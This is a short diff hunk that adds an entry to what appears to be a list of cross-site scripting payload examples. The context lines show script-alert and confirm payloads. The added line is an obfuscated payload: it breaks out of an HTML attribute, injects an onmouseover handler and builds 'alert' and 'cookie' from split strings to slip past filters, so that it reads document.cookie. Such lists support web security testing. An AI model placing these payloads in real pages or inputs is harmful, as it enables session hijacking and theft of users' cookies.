@@ -32,6 +32,7 @@ Examples:
 	\x27-confirm`1`-\x27 
 	\u0027-confirm`1`-\u0027 
 
+	"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))"> 
 
 	<html><body><script>alert(1)</script></body></html>
 
